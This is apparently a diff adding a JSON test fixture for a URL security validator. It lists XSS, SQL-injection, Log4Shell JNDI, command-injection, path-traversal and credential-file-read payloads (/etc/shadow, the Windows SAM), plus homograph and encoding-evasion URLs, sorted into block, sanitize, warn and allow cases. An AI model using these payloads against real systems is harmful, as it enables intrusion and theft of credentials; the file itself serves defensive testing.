@@ -1,0 +1,161 @@
+{
+  "version": "1.0.0",
+  "description": "Comprehensive collection of URLs for security validation testing",
+  "categories": {
+    "malicious_protocols": [
+      "javascript:alert('xss')",
+      "javascript:void(0)",
+      "javascript:window.location='http://malicious.com'",
+      "data:text/html,<script>alert('xss')</script>",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
+      "vbscript:msgbox('xss')",
+      "file:///etc/passwd",
+      "file:///C:/Windows/System32/config/sam",
+      "ftp://malicious.com/backdoor.exe",
+      "ldap://malicious.com/cn=users"
+    ],
+    "path_traversal": [
+      "../../../etc/passwd",
+      "..\\..\\..\\windows\\system32\\config\\sam",
+      "../../../../var/log/auth.log",
+      "../../../usr/bin/passwd",
+      "..\\..\\..\\Program Files\\sensitive.txt",
+      "/etc/passwd",
+      "/var/log/secure",
+      "/proc/version",
+      "/etc/shadow",
+      "C:\\Windows\\System32\\drivers\\etc\\hosts"
+    ],
+    "injection_attempts": [
+      "https://example.com/search?q=<script>alert('xss')</script>",
+      "https://example.com/user?id=1'; DROP TABLE users; --",
+      "https://example.com/path?param=javascript:alert(1)",
+      "https://example.com/search?q=${jndi:ldap://malicious.com/a}",
+      "https://example.com/path?cmd=cat /etc/passwd",
+      "https://example.com/api?callback=<script>alert(1)</script>",
+      "https://example.com/redirect?url=javascript:alert(1)",
+      "https://example.com/proxy?target=file:///etc/passwd"
+    ],
+    "suspicious_domains": [
+      "https://malicious.com",
+      "https://phishing-site.com",
+      "https://suspicious-domain.net",
+      "https://known-malware.org",
+      "https://command-control.evil",
+      "https://data-exfiltration.bad",
+      "https://crypto-miner.malicious",
+      "https://botnet-node.suspicious"
+    ],
+    "blocked_file_types": [
+      "https://example.com/download/virus.exe",
+      "https://example.com/files/malware.bat",
+      "https://example.com/scripts/backdoor.vbs",
+      "https://example.com/downloads/trojan.scr",
+      "https://example.com/files/keylogger.pif",
+      "https://example.com/malware/rootkit.com",
+      "https://example.com/suspicious/payload.jar",
+      "https://example.com/downloads/exploit.msi"
+    ],
+    "social_engineering": [
+      "https://example.com/urgent-security-update.exe",
+      "https://example.com/your-account-suspended.html",
+      "https://example.com/claim-your-prize-now.php",
+      "https://example.com/verify-your-identity.asp",
+      "https://example.com/download-antivirus-now.exe",
+      "https://example.com/tax-refund-pending.html",
+      "https://example.com/bank-security-alert.php"
+    ],
+    "encoding_evasion": [
+      "https://example.com/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "https://example.com/..%252f..%252f..%252fetc%252fpasswd",
+      "https://example.com/%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32",
+      "https://example.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "https://example.com/path?param=java%73cript:alert(1)",
+      "https://example.com/redirect?url=%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29"
+    ],
+    "unicode_attacks": [
+      "https://example.com/path/\u202e\u0644\u0645\u0646\u0647\u0627\u0631\u0627\u0644\u0639\u0631\u0628\u064a\u0629",
+      "https://example.com/search?q=\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
+      "https://example.com/path?param=\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "https://example.com/unicode/\u0001\u0002\u0003\u0004\u0005\u0006\u0007\u0008"
+    ],
+    "homograph_attacks": [
+      "https://аpple.com",
+      "https://gооgle.com",
+      "https://аmazon.com",
+      "https://раypal.com",
+      "https://microsоft.com",
+      "https://fаcebook.com"
+    ],
+    "ip_based_suspicious": [
+      "https://192.168.1.1/admin",
+      "https://10.0.0.1/config",
+      "https://172.16.0.1/setup",
+      "https://127.0.0.1:8080/backdoor",
+      "https://0.0.0.0/exploit",
+      "https://255.255.255.255/broadcast"
+    ],
+    "port_scanning": [
+      "https://example.com:22/ssh",
+      "https://example.com:23/telnet",
+      "https://example.com:135/rpc",
+      "https://example.com:139/netbios",
+      "https://example.com:445/smb",
+      "https://example.com:1433/mssql",
+      "https://example.com:3389/rdp",
+      "https://example.com:5432/postgresql"
+    ]
+  },
+  "test_scenarios": {
+    "should_block": {
+      "description": "URLs that should be blocked by security validation",
+      "urls": [
+        "javascript:alert('xss')",
+        "../../../etc/passwd",
+        "https://malicious.com",
+        "ftp://suspicious.com/file.exe",
+        "file:///etc/passwd"
+      ]
+    },
+    "should_sanitize": {
+      "description": "URLs that should be sanitized or escaped",
+      "urls": [
+        "https://example.com/search?q=<script>alert(1)</script>",
+        "https://example.com/path?param=javascript:void(0)",
+        "https://example.com/redirect?url=data:text/html,<script>"
+      ]
+    },
+    "should_warn": {
+      "description": "URLs that should trigger security warnings",
+      "urls": [
+        "https://example.com/download/file.exe",
+        "https://192.168.1.1/admin",
+        "https://example.com:22/ssh"
+      ]
+    },
+    "should_allow": {
+      "description": "URLs that should pass security validation",
+      "urls": [
+        "https://example.com/safe/path",
+        "https://trusted-domain.com",
+        "https://api.example.com/v1/endpoint"
+      ]
+    }
+  },
+  "metadata": {
+    "total_urls": 89,
+    "created_at": "2025-01-01T00:00:00Z",
+    "updated_at": "2025-01-01T00:00:00Z",
+    "tags": ["security", "malicious", "xss", "injection", "traversal", "testing"],
+    "security_categories": [
+      "protocol_validation",
+      "path_traversal_detection",
+      "injection_prevention",
+      "domain_filtering",
+      "file_type_blocking",
+      "encoding_validation",
+      "unicode_normalization",
+      "homograph_detection"
+    ]
+  }
+}
